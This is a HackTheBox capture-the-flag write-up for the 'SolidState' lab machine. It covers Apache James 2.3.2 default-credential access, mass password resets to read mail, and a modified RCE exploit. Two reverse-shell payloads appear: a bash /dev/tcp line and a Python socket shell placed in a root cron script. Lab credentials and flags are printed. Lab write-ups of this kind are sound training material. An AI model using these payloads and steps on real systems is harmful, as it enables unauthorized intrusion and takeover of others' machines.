---
title: HackTheBox - SolidState
author: yufong
categories: [HackTheBox, HackTheBox - Linux]
date: 2022-08-25
tags: [jail]
img_path: /_posts/Writeups/HackTheBox/Linux/SolidState/images/
image:
  path: /_posts/Writeups/HackTheBox/Linux/SolidState/images/Pasted%20image%2020220825061518.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Overview 
This machine w/ an network enumeration, enumerating a service `James Server 2.3.2`, which is susceptible to an authenticated RCE exploit. 

Also, `James Server 2.3.2` is configured w/ its default password, allowing us to view users on the machine as well as change their password, allowing us to access `mindy`'s mail w/ SMTP, revealing SSH creds. 

After SSH w/ `mindy`'s creds, we are locked in a jailshell, but w/ the `James Server 2.3.2` exploit, we are able to execute a reverse shell, spawning another shell, escaping the jailshell.

For privilege escalation, after enumerating the system w/ `linpeas.sh`, there is a file that is out of the norm `/opt/tmp.py` and `mindy` has `RWX` access to it.  Also, `pspy32` detected a cronjob is executing `/opt/tmp.py` as root every 3 minutes. To exploit, we replace `/opt/tmp.py` w/ a python reverse shell, escalating our privilege to `root`.

---

| Column       | Details     |
| ------------ | ----------- |
| Box Name     | Solid State |
| IP           | 10.10.10.51 |
| Points       | -           |
| Difficulty   | Medium      |
| Creator      |  [ch33zplz](https://www.hackthebox.com/home/users/profile/3338)            |
| Release Date | 08-Sep-2017            |


# Recon

## TCP/80 (HTTP)
### FFUF
```
200      GET       63l     2733w    17128c http://10.10.10.51/LICENSE.txt
200      GET       34l      133w      963c http://10.10.10.51/README.txt
200      GET      129l      789w     7183c http://10.10.10.51/about.html
301      GET        9l       28w      311c http://10.10.10.51/assets => http://10.10.10.51/assets/
301      GET        9l       28w      311c http://10.10.10.51/images => http://10.10.10.51/images/
200      GET      179l      680w     7776c http://10.10.10.51/index.html
403      GET       11l       32w      299c http://10.10.10.51/server-status
200      GET      130l      967w     8404c http://10.10.10.51/services.html
```

## TCP/4555 (James Server 2.3.2)
### NMAP
```
4555/tcp open  rsip?   syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
```
- `JAMES Remote Administration Tool 2.3.2`

### NC
```
┌──(root💀kali)-[~/htb/solidstate]
└─# nc $ip 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
```


# Initial Foothold

## TCP/80 (HTTP) 
1. After browsing through the webserver, could not find anything interesting.

## TCP/4555 (James Server 2.3.2)
1. `TCP/4555 - James Server 2.3.2` is out of the norm, we have to enumerate the service.
2. `James Server 2.3.2`
	- James stands for **Java Apache Mail Enterprise Server**
	- It has a modular architecture based on a rich set of **modern** and **efficient** components which provides at the end **complete, stable, secure and extendable Mail Servers running on the JVM**.
	- [Default Credentials](https://james.apache.org/server/archive/configuration_v2_0.html)
		- `root:root`
1. Search exploits for `James`, found exact matches to our version

	| Exploit Title                                                                      |    Path               |
	| ---------------------------------------------------------------------------------- | --------------------- |
	| Apache James Server 2.2 - SMTP Denial of Service                                   | multiple/dos/27915.pl |
	| Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploi | linux/remote/48130.rb |
	| Apache James Server 2.3.2 - Remote Command Execution                               | linux/remote/35513.py |
	| Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)     | linux/remote/50347.py |
		
3. Try `linux/remote/35513.py`
	1. How does the exploit work?
		- Due the lack of input sanitization when creating a user in `James Server 2.3.2`, messages for a given user are stored in a directory partially defined by the username, by creating a user w/ path traversal payload (`../`) as its username, commands can be written to a given directory. 
		- The exploit could work w/ cronjob so that we get a shell after cronjob executes, however, it is not guarenteed to work due to how cron may run in certain Linux systems.
		- Preferably, we set the target to bash completion, and when the user logs into the system, the payload will be executed.
	2. The exploit requires us to login to `James Server 2.3.2` and also into the system in order for the payload to be executed.
	3. Lets enumerate `SMTP, POP3` before continuing w/ the exploit
4. Before exploiting `James Server 2.3`, access it w/ default creds to do further enumeration
	1. `HELP` to view commands
		![]({{ page.img_path }}Pasted%20image%2020220825025553.png)
		- `listusers`, we are able to list `users` in the system
		- `setpassword`, we are able to change any `user`'s password, allowing us to access their account through SMTP and read mails.
	2. View `users` on the system
		![]({{ page.img_path }}Pasted%20image%2020220825031059.png)
		- Users:
			- `james`
			- `thomas`
			- `john`
			- `mindy`
			- `mailadmin`
	3. Change all users password to `password`
		```
		setpassword james password
		setpassword thomas password
		setpassword john password
		setpassword mindy password
		setpassword mailadmin password
		```
		![]({{ page.img_path }}Pasted%20image%2020220825031413.png)

## Accessing the SMTP Server
1. Access SMTP server w/ `POP3`
	```
	┌──(root💀kali)-[~/htb/solidstate/10.10.10.51/exploit]
	└─# telnet 10.10.10.51 110
	Trying 10.10.10.51...
	Connected to 10.10.10.51.
	Escape character is '^]'.
	+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
	USER mindy
	+OK
	PASS password
	+OK Welcome mindy
	list
	+OK 2 1945
	1 1109
	2 836
	.
	```
	- `thomas` - No mails
	- `james` - No mail
	- `john` - No mails
	- `mindy` - Found mails
2. View mail w/ `thunderbird`
	![]({{ page.img_path }}Pasted%20image%2020220825034752.png)
	- `mindy:P@55W0rd1!2@`


## TCP/22 (SSH) 
1. Access w/ `mindy:P@55W0rd1!2@`
	```
	┌──(root💀kali)-[~/htb/solidstate/10.10.10.51/exploit]
	└─# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51
	```
	![]({{ page.img_path }}Pasted%20image%2020220825040323.png)
	- `rbash`
		- We are in a jail shell
		- [Escape it](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)
3. Earlier, we found an RCE exploit on `James Server 2.3.2` that executes the payload when the user logs in, we can use this to escape the jail shell.

## TCP/4555 (James Server 2.3.2) - RCE exploit
1. Try  `linux/remote/35513.py`
	1. Change `payload` in  `/linux/remote/35513.py`
		```
		...
		payload = '/bin/bash -i >& /dev/tcp/10.10.14.31/4444 0>&1' 
		... 
		```
	2. Run exploit
		```
		┌──(root💀kali)-[~/htb/solidstate/10.10.10.51/exploit]
		└─# python 35513.py 10.10.10.51
		[+]Connecting to James Remote Administration Tool...
		[+]Creating user...
		[+]Connecting to James SMTP server...
		[+]Sending payload...
		[+]Done! Payload will be executed once somebody logs in.
		```
	3. Start listener 
	2. Login to `mindy`
		```
		┌──(root💀kali)-[~/htb/solidstate/10.10.10.51/exploit]
		└─# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51
		```
		![]({{ page.img_path }}Pasted%20image%2020220825041617.png)
		- Jailshell escaped!
2. User Flag
	```
	4d9a00315a76957167ef83161bd7abe9
	```
	![]({{ page.img_path }}Pasted%20image%2020220825041833.png)


# Privilege Escalation

## Root - Via Cronjob
1. Found something interesting w/ `linpeas.sh`
	![]({{ page.img_path }}Pasted%20image%2020220825044822.png)
	- We have `RWX` access to `/opt/tmp.py`
2. Sniff processes w/ `pspy32`
	![]({{ page.img_path }}Pasted%20image%2020220825044608.png)
	- A cronjob running as `root` is executing `/opt/tmp.py` every 3 minutes
3. Exploit
	1. How does it work?
	2. Since we have `RWX` to `/opt/tmp.py` and it is being executed as `root`, we can replace `/opt/tmp.py` w/ a python reverse shell to escalate our privileges to `root`
	3. Create python script
		```
		mindy@solidstate:~/bin$ nano /tmp/tmp.py
		
		import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
		```
	4. Replace `/opt/tmp.py` w/ `/tmp/tmp.py`
		```
		mindy@solidstate:~/bin$ cp /tmp/tmp.py /opt/tmp.py 
		```
	5. Start listener and wait for cronjob to execute 
	7. Obtained Shell & Root Flag
		```
		fec122a2b91fc6cf33e0ad4276a685ad
		```
		![]({{ page.img_path }}Pasted%20image%2020220825045806.png)

